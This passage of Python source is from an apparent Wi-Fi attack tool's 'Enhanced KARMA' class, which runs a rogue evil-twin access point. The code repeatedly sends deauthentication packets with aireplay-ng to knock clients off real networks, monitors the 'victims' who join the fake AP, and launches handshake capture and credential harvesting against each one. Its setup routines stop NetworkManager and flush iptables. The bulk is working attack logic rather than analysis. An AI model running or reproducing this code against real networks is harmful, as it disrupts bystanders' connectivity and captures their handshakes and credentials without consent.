                Color.pl('{+} {G}Created unique SSID: {C}%s{W} for interface {G}%s{W}' % (unique_ssid, interface))
                return new_config
            else:
                return config_file
                
        except Exception as e:
            Color.pl('{!} {R}Error creating unique SSID config: {O}%s{W}' % str(e))
            return config_file
    
    def create_interface_specific_config(self, original_config, interface):
        """Create a config file for a specific interface"""
        try:
            # Read original config
            with open(original_config, 'r') as f:
                content = f.read()
            
            # Replace interface
            modified_content = content.replace(f'interface={self.rogue_interface}', f'interface={interface}')
            
            # Create new config file
            new_config = original_config.replace('.conf', f'_{interface}.conf')
            with open(new_config, 'w') as f:
                f.write(modified_content)
            
            return new_config
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error creating interface config: {O}%s{W}' % str(e))
            return None
    
    def monitor_connections(self):
        """Monitor for client connections to rogue AP with improved detection"""
        try:
            Color.pl('{+} {C}Starting KARMA monitoring - waiting for victims...{W}')
            
            # Initialize victim management once, not in loop
            if not hasattr(self, '_victim_mgmt_started'):
                self.start_victim_management()
                self._victim_mgmt_started = True
            
            last_status_time = time.time()
            status_interval = 30  # Show status every 30 seconds
            
            while self.running:
                current_time = time.time()
                
                # Check for connected clients using multiple methods
                connected_macs = self.detect_rogue_ap_connections()
                
                # Check for new connections
                new_connections = connected_macs - self.connected_clients
                if new_connections:
                    for mac in new_connections:
                        Color.pl('{+} {G}🎯 New victim connected: {C}%s{W}' % mac)
                        self.connected_clients.add(mac)
                        
                        # Check if we have probe data for this client
                        if mac in self.client_probes:
                            Color.pl('{+} {C}Client PNL:{W} {G}%s{W}' % ', '.join(self.client_probes[mac]))
                        
                        # Start handshake capture for this client
                        if mac not in self.captured_handshakes:
                            Color.pl('{+} {C}Attempting to capture handshake from {G}%s{W}...' % mac)
                            # Use threading to avoid blocking the main monitoring loop
                            handshake_thread = threading.Thread(
                                target=self.capture_handshake_for_client,
                                args=(mac,),
                                name=f'handshake_{mac.replace(":", "")}'
                            )
                            handshake_thread.daemon = True
                            
                            # Track threads properly to prevent resource leaks
                            if not hasattr(self, 'active_threads'):
                                self.active_threads = []
                            self.active_threads.append(handshake_thread)
                            
                            handshake_thread.start()
                        
                        # Start credential harvesting for this client
                        self.harvest_credentials_from_client(mac)
                
                # Show periodic status updates
                if current_time - last_status_time >= status_interval:
                    self.show_connection_status()
                    last_status_time = current_time
                
                # Adaptive sleep based on activity
                if len(self.connected_clients) > 0:
                    time.sleep(3)  # More frequent checks when clients are connected
                else:
                    time.sleep(8)  # Less frequent checks when no clients
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error monitoring connections: {O}%s{W}' % str(e))
    
    def detect_rogue_ap_connections(self):
        """Detect client connections to our rogue AP using multiple methods"""
        try:
            connected_macs = set()
            
            # Method 1: Check hostapd station dump
            try:
                cmd = ['iw', 'dev', str(self.rogue_interface), 'station', 'dump']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'Station' in line:
                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                            if mac_match:
                                connected_macs.add(mac_match.group(1).lower())
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, OSError) as e:
                if Configuration.verbose > 1:
                    Color.pl('{!} {R}Error checking station dump: {O}%s{W}' % str(e))
            
            # Method 2: Check DHCP leases if dnsmasq is running
            if hasattr(self, 'dnsmasq_config') and self.dnsmasq_config:
                try:
                    leases_file = self.dnsmasq_config.replace('.conf', '.leases')
                    if os.path.exists(leases_file):
                        with open(leases_file, 'r') as f:
                            for line in f:
                                parts = line.strip().split()
                                if len(parts) >= 3:
                                    mac = parts[1].lower()
                                    connected_macs.add(mac)
                except (FileNotFoundError, PermissionError, IOError) as e:
                    if Configuration.verbose > 1:
                        Color.pl('{!} {R}Error reading DHCP leases file: {O}%s{W}' % str(e))
            
            # Method 3: Check ARP table for clients on our subnet
            try:
                cmd = ['arp', '-a']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if '10.0.0.' in line and '(' in line and ')' in line:
                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                            if mac_match:
                                connected_macs.add(mac_match.group(1).lower())
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, OSError) as e:
                if Configuration.verbose > 1:
                    Color.pl('{!} {R}Error checking ARP table: {O}%s{W}' % str(e))
            
            return connected_macs
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error detecting connections: {O}%s{W}' % str(e))
            return set()
    
    def show_connection_status(self):
        """Show detailed connection status"""
        try:
            if len(self.connected_clients) > 0:
                Color.pl('{+} {G}🎯 KARMA Active - {C}%d{W} clients connected{W}' % len(self.connected_clients))
                for mac in self.connected_clients:
                    status = "Handshake captured" if mac in self.captured_handshakes else "Monitoring"
                    Color.pl('  {G}* {W}%s - {C}%s{W}' % (mac, status))
            else:
                Color.pl('{+} {C}KARMA monitoring - waiting for victims to connect...{W}')
                Color.pl('{+} {O}Deauth attacks active on {C}%d{W} networks{W}' % len(self.real_networks))
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error showing status: {O}%s{W}' % str(e))
    
    def start_victim_management(self):
        """Start victim management - kick users from real networks to force connection to fake AP"""
        try:
            Color.pl('{+} {C}Starting victim management - forcing disconnections from real networks{W}')
            
            # Use existing real_networks instead of creating new Airodump process
            if hasattr(self, 'real_networks') and self.real_networks:
                for target in self.real_networks:
                    if target.clients and target.essid_known:
                        # Kick clients from this real network
                        self.kick_clients_from_network(target)
            else:
                # Fallback: Get list of real networks with clients (only if needed)
                with Airodump(interface=self.probe_interface,
                             output_file_prefix='karma_victims') as airodump:
                    
                    time.sleep(3)  # Brief scan
                    targets = airodump.get_targets()
                    
                    for target in targets:
                        if target.clients and target.essid_known:
                            # Kick clients from this real network
                            self.kick_clients_from_network(target)
                        
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error starting victim management: {O}%s{W}' % str(e))
    
    def kick_clients_from_network(self, target):
        """Kick clients from a real network to force them to connect to fake AP"""
        try:
            if not target.clients:
                return
                
            Color.pl('{+} {C}Kicking clients from {G}%s{W} ({C}%s{W}) to force fake AP connection{W}' % 
                    (target.essid, target.bssid))
            
            # Use aireplay to send deauth packets
            for client in target.clients:
                try:
                    # Send deauth packets to client
                    deauth_cmd = [
                        'aireplay-ng',
                        '-0', '2',  # Reduced to 2 deauth packets
                        '--ignore-negative-one',
                        '-a', target.bssid,  # Target AP
                        '-c', client.bssid,  # Target client
                        self.probe_interface
                    ]
                    
                    # Run deauth with proper process management
                    try:
                        process = subprocess.Popen(deauth_cmd, 
                                                 stdout=subprocess.DEVNULL, 
                                                 stderr=subprocess.DEVNULL,
                                                 preexec_fn=os.setsid)
                        process.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        try:
                            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                        except:
                            pass
                        process.kill()
                    
                    if Configuration.verbose > 1:
                        Color.pl('{+} {C}Sent deauth to {G}%s{W} from {G}%s{W}' % (client.bssid, target.essid))
                        
                except Exception as e:
                    if Configuration.verbose > 1:
                        Color.pl('{!} {R}Failed to deauth {G}%s{W}: {O}%s{W}' % (client.bssid, str(e)))
                        
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error kicking clients from network: {O}%s{W}' % str(e))
    
    
    def start_monitoring(self):
        """Start unified monitoring with all attack components"""
        Color.pl('{+} {C}Starting KARMA monitoring - All components active{W}')
        
        try:
            # Start credential harvesting in background
            harvest_thread = threading.Thread(target=self.monitor_credential_harvesting)
            harvest_thread.daemon = True  # Consistent daemon setting
            harvest_thread.start()
            
            # Start victim management
            self.start_victim_management()
            
            Color.pl('{+} {G}Waiting for victims to connect...{W}')
            
            while self.running:
                # Monitor connections
                self.monitor_connections()
                
                # Show status
                self.show_attack_status()
                
                time.sleep(5)
                
        except KeyboardInterrupt:
            Color.pl('{!} {O}KARMA attack interrupted by user{W}')
            # Ensure cleanup runs when interrupted
            self.cleanup()
        except Exception as e:
            Color.pl('{!} {R}Monitoring error: {O}%s{W}' % str(e))
            # Ensure cleanup runs on error
            self.cleanup()
    
    def start_dual_interface_monitoring(self):
        """Start monitoring for dual interface mode (probe capture + rogue AP simultaneously)"""
        Color.pl('{+} {C}Starting dual interface monitoring{W}')
        Color.pl('{+} {G}Probe capture: {C}%s{W} (monitor mode){W}' % self.probe_interface)
        Color.pl('{+} {G}Rogue AP: {C}%s{W} (managed mode){W}' % self.rogue_interface)
        
        try:
            # Start continuous probe capture in background
            probe_thread = threading.Thread(target=self.continuous_probe_capture)
            probe_thread.daemon = True  # Consistent daemon setting
            probe_thread.start()
            
            # Start credential harvesting in background
            harvest_thread = threading.Thread(target=self.monitor_credential_harvesting)
            harvest_thread.daemon = True  # Consistent daemon setting
            harvest_thread.start()
            
            # Start victim management
            self.start_victim_management()
            
            Color.pl('{+} {G}Dual interface monitoring active - waiting for victims...{W}')
            
            while self.running:
                # Monitor connections
                self.monitor_connections()
                
                # Show status
                self.show_attack_status()
                
                time.sleep(5)
                
        except KeyboardInterrupt:
            Color.pl('{!} {O}KARMA attack interrupted by user{W}')
            # Ensure cleanup runs when interrupted
            self.cleanup()
        except Exception as e:
            Color.pl('{!} {R}Dual interface monitoring error: {O}%s{W}' % str(e))
            # Ensure cleanup runs on error
            self.cleanup()
    
    def continuous_probe_capture(self):
        """Continuous probe capture for dual interface mode"""
        try:
            Color.pl('{+} {C}Starting continuous probe capture on {G}%s{W}...{W}' % self.probe_interface)
            
            while self.running:
                # Capture probe requests for 30 seconds
                with Airodump(interface=self.probe_interface, 
                             output_file_prefix='karma_continuous',
                             delete_existing_files=False) as airodump:
                    
                    timer = Timer(30)  # 30 second intervals
                    while not timer.ended() and self.running:
                        time.sleep(1)
                    
                    # Parse new probe requests
                    self.parse_continuous_probes()
                    
        except Exception as e:
            Color.pl('{!} {R}Continuous probe capture error: {O}%s{W}' % str(e))
    
    def parse_continuous_probes(self):
        """Parse continuous probe requests and update PNL"""
        try:
            # This would parse the continuous airodump output
            # and update the PNL with new networks
            pass
        except Exception as e:
            Color.pl('{!} {R}Error parsing continuous probes: {O}%s{W}' % str(e))

    def log_status(self, message, level='info'):
        """Helper method for consistent logging"""
        if level == 'info':
            Color.pl('{+} {C}%s{W}' % message)
        elif level == 'success':
            Color.pl('{+} {G}%s{W}' % message)
        elif level == 'warning':
            Color.pl('{!} {O}%s{W}' % message)
        elif level == 'error':
            Color.pl('{!} {R}%s{W}' % message)
        elif level == 'debug' and Configuration.verbose > 1:
            Color.pl('{+} {C}[DEBUG] %s{W}' % message)
    
    def log_phase(self, phase_name, action):
        """Log phase transitions consistently"""
        Color.pl('{+} {C}%s: %s{W}' % (phase_name, action))
        if hasattr(self, 'target') and self.target:
            Color.pattack('KARMA', self.target, phase_name, action)
    
    def check_hostapd_availability(self):
        """Check if hostapd is available and working"""
        try:
            # First check if hostapd binary exists
            result = subprocess.run(['which', 'hostapd'], capture_output=True, text=True)
            if result.returncode != 0:
                error_msg = 'hostapd not found - please install it'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Install with: sudo apt install hostapd{W}')
                Color.pl('{!} {O}Or try: sudo apt update && sudo apt install hostapd{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            # Check and resolve common conflicts before testing
            if not self.resolve_hostapd_conflicts():
                return False
            
            # Test if hostapd can actually start with a configuration
            # Create a minimal test config using dynamic temp directory
            import tempfile
            import os
            test_config = os.path.join(tempfile.gettempdir(), 'test_hostapd_karma.conf')
            try:
                with open(test_config, 'w') as f:
                    # Use dynamic interface detection for test config
                    from ..gui.utils import SystemUtils
                    interfaces = SystemUtils.get_wireless_interfaces()
                    test_interface = interfaces[0] if interfaces else None
                    
                    if not test_interface:
                        error_msg = 'No interface available for hostapd test'
                        Color.pl('{!} {R}%s{W}' % error_msg)
                        
                        # Also log to GUI
                        if hasattr(self, 'target') and self.target:
                            Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                        return False
                    
                    f.write(f'interface={test_interface}\ndriver=nl80211\nssid=test\nhw_mode=g\nchannel=1\n')
                
                # Test hostapd with the config (non-blocking)
                result = subprocess.run(['hostapd', '-B', test_config], 
                                      capture_output=True, text=True, timeout=3)
                
                # Clean up test config
                import os
                if os.path.exists(test_config):
                    os.remove(test_config)
                
                # Check if hostapd started successfully
                if result.returncode != 0:
                    error_msg = 'hostapd cannot start - interface or permission issue'
                    Color.pl('{!} {R}%s{W}' % error_msg)
                    if result.stderr:
                        Color.pl('{!} {O}hostapd error: {R}%s{W}' % result.stderr.strip()[:100])
                    
                    # Provide specific troubleshooting steps
                    self.provide_hostapd_troubleshooting()
                    
                    # Also log to GUI
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                    return False
                    
            except Exception as e:
                error_msg = f'hostapd test failed: {str(e)}'
                Color.pl('{!} {R}%s{W}' % error_msg)
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            # Additional check: interface permissions
            if not self.check_interface_permissions():
                return False
            
            Color.pl('{+} {G}hostapd is available and working{W}')
            return True
            
        except Exception as e:
            error_msg = f'Error checking hostapd: {str(e)}'
            Color.pl('{!} {R}%s{W}' % error_msg)
            
            # Also log to GUI
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
            return False
    
    def check_interface_permissions(self):
        """Check if the interface has proper permissions for hostapd"""
        try:
            # Check if running as root
            if os.geteuid() != 0:
                error_msg = 'KARMA attack requires root privileges'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Run with: sudo python -m wifitex.gui{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            # Check if interface exists using dynamic detection
            from ..gui.utils import SystemUtils
            interfaces = SystemUtils.get_wireless_interfaces()
            interface = interfaces[0] if interfaces else None
            
            if not interface:
                error_msg = 'No wireless interface found'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Check interface name and ensure monitor mode is enabled{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            if not os.path.exists(f'/sys/class/net/{interface}'):
                error_msg = f'Interface {interface} not found'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Check interface name and ensure monitor mode is enabled{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            # Check if NetworkManager is interfering
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], 
                                      capture_output=True, text=True, timeout=2)
                if result.returncode == 0 and 'active' in result.stdout:
                    Color.pl('{!} {O}Warning: NetworkManager is running - may interfere with hostapd{W}')
                    Color.pl('{!} {O}If hostapd fails, try: sudo systemctl stop NetworkManager{W}')
            except Exception:
                pass  # Ignore if systemctl is not available
            
            return True
            
        except Exception as e:
            error_msg = f'Error checking interface permissions: {str(e)}'
            Color.pl('{!} {R}%s{W}' % error_msg)
            
            # Also log to GUI
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
            return False
    
    
    def resolve_hostapd_conflicts(self):
        """Resolve common conflicts that prevent hostapd from starting"""
        try:
            Color.pl('{+} {C}Checking for hostapd conflicts...{W}')
            
            # Check and stop NetworkManager if it's interfering
            if not self.stop_network_manager():
                return False
            
            # Check and fix interface mode conflicts
            if not self.switch_interface_mode('master', 'Conflict Resolution'):
                return False
            
            # Check and fix permission issues
            if not self.fix_permission_issues():
                return False
            
            Color.pl('{+} {G}Hostapd conflicts resolved{W}')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error resolving hostapd conflicts: {O}%s{W}' % str(e))
            return False
    
    def stop_network_manager(self):
        """Stop NetworkManager if it's interfering with hostapd"""
        try:
            # Check if NetworkManager is running
            result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], 
                                  capture_output=True, text=True, timeout=2)
            
            if result.returncode == 0 and 'active' in result.stdout:
                Color.pl('{!} {O}NetworkManager is running - stopping to prevent conflicts{W}')
                
                # Stop NetworkManager
                stop_result = subprocess.run(['systemctl', 'stop', 'NetworkManager'], 
                                           capture_output=True, text=True, timeout=5)
                
                if stop_result.returncode == 0:
                    Color.pl('{+} {G}NetworkManager stopped successfully{W}')
                    return True
                else:
                    Color.pl('{!} {R}Failed to stop NetworkManager: {O}%s{W}' % stop_result.stderr.strip())
                    Color.pl('{!} {O}Try manually: sudo systemctl stop NetworkManager{W}')
                    return False
            else:
                Color.pl('{+} {G}NetworkManager is not running - no conflict{W}')
                return True
                
        except Exception as e:
            Color.pl('{!} {O}Could not check NetworkManager status: {O}%s{W}' % str(e))
            return True  # Continue anyway
    
    
    
    def find_monitor_interface(self, base_interface):
        """Find the monitor mode interface name"""
        try:
            # Use system detection to find actual interfaces - no hardcoded names
            possible_names = SystemUtils.get_wireless_interfaces()
            
            for name in possible_names:
                try:
                    result = subprocess.run(['iwconfig', name], capture_output=True, text=True, timeout=3)
                    if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
                        return name
                except:
                    continue
            
            # If not found, try to get from airmon-ng
            result = subprocess.run(['airmon-ng'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if base_interface in line and 'mon' in line:
                        parts = line.split()
                        if parts:
                            return parts[0]
            
            return None
            
        except Exception as e:
            Color.pl('{!} {R}Error finding monitor interface: {O}%s{W}' % str(e))
            return None

    def final_interface_preparation(self):
        """Final interface preparation steps before starting hostapd"""
        try:
            interface = getattr(self, 'rogue_interface', None)
            if not interface:
                from ..gui.utils import SystemUtils
                interfaces = SystemUtils.get_wireless_interfaces()
                interface = interfaces[0] if interfaces else None
            
            # Check if we have a valid interface
            if not interface:
                Color.pl('{!} {R}No interface available for final preparation{W}')
                return False
            
            Color.pl('{+} {C}Performing final interface preparation...{W}')
            
            # Clean up interface name - convert monitor interfaces to base interfaces
            interface = self.cleanup_interface_name(interface)
            
            # Ensure interface is up
            subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=5)
            
            # Check current interface mode
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                if 'Mode:Master' in result.stdout or 'Mode:AP' in result.stdout:
                    Color.pl('{+} {G}Interface {G}%s{W} is already in AP mode - skipping mode change{W}' % interface)
                    return True
                elif 'Mode:Managed' in result.stdout:
                    Color.pl('{+} {C}Interface {G}%s{W} is in managed mode - switching to AP mode{W}' % interface)
                    # Switch to master mode for hostapd
                    success = self.switch_to_master_mode(interface)
                    if not success:
                        Color.pl('{!} {R}Failed to switch interface to AP mode{W}')
                        return False
                    return True
                else:
                    Color.pl('{+} {C}Interface {G}%s{W} mode unknown - attempting to set AP mode{W}' % interface)
                    # Switch to master mode for hostapd
                    success = self.switch_to_master_mode(interface)
                    if not success:
                        Color.pl('{!} {R}Failed to switch interface to AP mode{W}')
                        return False
                    return True
            else:
                Color.pl('{!} {R}Failed to check interface mode{W}')
                return False
                
        except Exception as e:
            Color.pl('{!} {R}Error in final interface preparation: {O}%s{W}' % str(e))
            return False

    def fix_permission_issues(self):
        """Fix common permission issues"""
        try:
            # Check if running as root
            if os.geteuid() != 0:
                Color.pl('{!} {R}KARMA attack requires root privileges{W}')
                Color.pl('{!} {O}Run with: sudo python -m wifitex.gui{W}')
                return False
            
            # Fix tun device permissions using dynamic device path
            tun_device = '/dev/net/tun'
            if os.path.exists(tun_device):
                try:
                    subprocess.run(['chmod', '666', tun_device], check=True)
                    Color.pl('{+} {G}Fixed tun device permissions{W}')
                except subprocess.CalledProcessError:
                    Color.pl('{!} {O}Could not fix tun device permissions{W}')
            
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error fixing permissions: {O}%s{W}' % str(e))
            return False
    
    def provide_hostapd_troubleshooting(self):
        """Provide comprehensive troubleshooting steps for hostapd issues"""
        # Prefer configured rogue_interface; fallback to detected interface (no hardcoded names)
        interface = getattr(self, 'rogue_interface', None)
        if not interface:
            try:
                from ..gui.utils import SystemUtils
                detected = SystemUtils.get_wireless_interfaces()
                interface = detected[0] if detected else 'unknown'
            except Exception:
                interface = 'unknown'
        
        Color.pl('{!} {O}=== Hostapd Troubleshooting Steps ==={W}')
        Color.pl('{!} {O}1. Stop NetworkManager: sudo systemctl stop NetworkManager{W}')
        Color.pl('{!} {O}2. Check interface mode: iwconfig %s{W}' % interface)
        Color.pl('{!} {O}3. Switch to managed mode: sudo iwconfig %s mode managed{W}' % interface)
        Color.pl('{!} {O}4. Fix permissions: sudo chmod 666 /dev/net/tun{W}')
        Color.pl('{!} {O}7. Restart interface: sudo ifconfig %s down && sudo ifconfig %s up{W}' % (interface, interface))
        Color.pl('{!} {O}8. Check hostapd version: hostapd -v{W}')
        Color.pl('{!} {O}9. Reinstall hostapd: sudo apt remove hostapd && sudo apt install hostapd{W}')
        Color.pl('{!} {O}11. Try different interface: Use a separate WiFi adapter for AP mode{W}')
        Color.pl('{!} {O}=== End Troubleshooting ==={W}')
    
    def check_dnsmasq_availability(self):
        """Check if dnsmasq is available and working"""
        try:
            # First check if dnsmasq binary exists
            result = subprocess.run(['which', 'dnsmasq'], capture_output=True, text=True)
            if result.returncode != 0:
                error_msg = 'dnsmasq not found - please install it'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Install with: sudo apt install dnsmasq{W}')
                Color.pl('{!} {O}Or try: sudo apt update && sudo apt install dnsmasq{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            # Test if dnsmasq can run (check version)
            result = subprocess.run(['dnsmasq', '--version'], capture_output=True, text=True, timeout=5)
            if result.returncode != 0:
                error_msg = 'dnsmasq not working properly - may need reinstallation'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Try: sudo apt remove dnsmasq && sudo apt install dnsmasq{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            Color.pl('{+} {G}dnsmasq is available and working{W}')
            return True
            
        except Exception as e:
            error_msg = f'Error checking dnsmasq: {str(e)}'
            Color.pl('{!} {R}%s{W}' % error_msg)
            
            # Also log to GUI
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
            return False
    
    def verify_ap_running(self):
        """Verify that the AP is actually running"""
        try:
            # Check if hostapd process is running
            result = subprocess.run(['pgrep', '-f', 'hostapd'], capture_output=True, text=True, timeout=3)
            if result.returncode == 0 and result.stdout.strip():
                Color.pl('{+} {G}hostapd process is running{W}')
                return True
            
            # Check interface state
            interface = getattr(self, 'rogue_interface', None)
            if not interface:
                try:
                    from ..gui.utils import SystemUtils
                    detected = SystemUtils.get_wireless_interfaces()
                    interface = detected[0] if detected else 'unknown'
                except Exception:
                    interface = 'unknown'
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if result.returncode == 0 and 'Mode:Master' in result.stdout:
                Color.pl('{+} {G}Interface is in Master mode (AP mode){W}')
                return True
            
            return False
            
        except Exception as e:
            Color.pl('{!} {O}Error verifying AP status: {O}%s{W}' % str(e))
            return False
    
    def cleanup(self):
        """Clean up processes and temporary files"""
        if getattr(self, '_cleanup_done', False):
            return
        self._cleanup_done = True
        Color.pl('\n{+} {C}Cleaning up Enhanced KARMA attack...{W}')
        
        self.running = False
        self.deauth_active = False
        self.handshake_capture_active = False
        
        # Clean up handshake capture threads
        self.cleanup_all_capture_threads()
        
        # Clean up active threads to prevent resource leaks
        if hasattr(self, 'active_threads') and self.active_threads:
            Color.pl('{+} {C}Cleaning up active threads...{W}')
            for thread in self.active_threads:
                if thread.is_alive():
                    Color.pl('{+} {C}Waiting for thread: {G}%s{W}' % thread.name)
                    thread.join(timeout=5)  # Wait up to 5 seconds
            self.active_threads.clear()
            Color.pl('{+} {G}Thread cleanup completed{W}')
        
        # Clean up all registered processes
        self.cleanup_all_processes()
        
        # Switch back to probe mode if using single interface
        if self.probe_interface == self.rogue_interface:
            Color.pl('{+} {C}Switching interface back to monitor mode for cleanup{W}')
            self.switch_interface_mode('monitor', 'Cleanup')
        
        # Stop main processes
        if self.rogue_ap_process:
            try:
                self.rogue_ap_process.terminate()
                Color.pl('{+} {G}Stopped primary Evil Twin AP{W}')
            except:
                pass
        
        # Stop DHCP server only if DNS spoofing was enabled
        if hasattr(self, 'dns_spoofing_enabled') and self.dns_spoofing_enabled and self.dhcp_process:
            try:
                self.dhcp_process.terminate()
                Color.pl('{+} {G}Stopped DHCP server{W}')
            except:
                pass
        
        # Stop additional Evil Twin processes
        if hasattr(self, 'additional_processes') and self.additional_processes:
            for i, process in enumerate(self.additional_processes, 1):
                try:
                    process.terminate()
                    Color.pl('{+} {G}Stopped additional Evil Twin AP {C}%d{W}' % i)
                except:
                    pass
        
        # Clean up iptables rules only if DNS spoofing was enabled
        if hasattr(self, 'dns_spoofing_enabled') and self.dns_spoofing_enabled:
            try:
                subprocess.run(['iptables', '-F'], capture_output=True)
                subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
                Color.pl('{+} {G}Cleaned up iptables rules{W}')
            except:
                pass
        
        # Clean up temporary files
        try:
            if hasattr(self, 'hostapd_config') and self.hostapd_config and os.path.exists(self.hostapd_config):
                os.remove(self.hostapd_config)
            if hasattr(self, 'dnsmasq_config') and self.dnsmasq_config and os.path.exists(self.dnsmasq_config):
                os.remove(self.dnsmasq_config)
            
            # Clean up additional config files
            if hasattr(self, 'additional_processes') and self.additional_processes:
                for i in range(len(self.additional_processes)):
                    config_pattern = f'*_unique_*.conf'
                    import glob
                    for config_file in glob.glob(config_pattern):
                        try:
                            os.remove(config_file)
                        except:
                            pass
            
            Color.pl('{+} {G}Cleaned up temporary files{W}')
        except:
            pass
        
        # Show final results
        self.show_final_results()
        
        # Fully restore network stack for subsequent runs
        try:
            self.restore_network_services()
        except Exception as e:
            Color.pl('{!} {R}Warning: Failed to restore network services: {O}%s{W}' % str(e))
            # Try basic cleanup even if restore fails
            self.basic_cleanup()
        
        Color.pl('{+} {G}Enhanced KARMA attack cleanup complete{W}')
        
        # Check if rfkill is still blocking interfaces
        try:
            result = subprocess.run(['rfkill', 'list'], capture_output=True, text=True)
            if 'Soft blocked: yes' in result.stdout:
                Color.pl('{!} {R}WARNING: Some wireless interfaces are still blocked!{W}')
                Color.pl('{!} {O}Run the following commands to restore your network:{W}')
                Color.pl('{!}   {C}sudo rfkill unblock all{W}')
                Color.pl('{!}   {C}sudo ./dev_restore.sh{W}')
                Color.pl('{!} {O}Or use the development restoration script in the project root{W}')
        except:
            pass

    def restore_network_services(self):
        """Enhanced restoration of services, iptables, and interface state after attack"""
        Color.pl('{+} {C}Performing enhanced network restoration for optimal scanning...{W}')
        
        # Kill processes
        try:
            subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True)
            Color.pl('{+} {G}Killed hostapd processes{W}')
        except Exception as e:
            Color.pl('{!} {O}Warning: Failed to kill hostapd: {R}%s{W}' % str(e))

        # Only kill dnsmasq if DNS spoofing was enabled
        if hasattr(self, 'dns_spoofing_enabled') and self.dns_spoofing_enabled:
            try:
                subprocess.run(['pkill', '-f', 'dnsmasq'], capture_output=True)
                Color.pl('{+} {G}Killed dnsmasq processes{W}')
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to kill dnsmasq: {R}%s{W}' % str(e))

        # Kill any remaining attack processes
        try:
            subprocess.run(['pkill', '-f', 'airodump'], capture_output=True)
            subprocess.run(['pkill', '-f', 'aireplay'], capture_output=True)
            subprocess.run(['pkill', '-f', 'airmon'], capture_output=True)
            Color.pl('{+} {G}Killed remaining attack processes{W}')
        except Exception as e:
            Color.pl('{!} {O}Warning: Failed to kill attack processes: {R}%s{W}' % str(e))

        # Disable IP forwarding
        try:
            result = subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True, text=True)
            if result.returncode == 0:
                Color.pl('{+} {G}Disabled IP forwarding{W}')
            else:
                Color.pl('{!} {O}Warning: Failed to disable IP forwarding{W}')
        except Exception as e:
            Color.pl('{!} {O}Warning: Failed to disable IP forwarding: {R}%s{W}' % str(e))

        # Clean iptables
        try:
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
            subprocess.run(['iptables', '-F'], capture_output=True)
            Color.pl('{+} {G}Cleaned iptables rules{W}')
        except Exception as e:
            Color.pl('{!} {O}Warning: Failed to clean iptables: {R}%s{W}' % str(e))

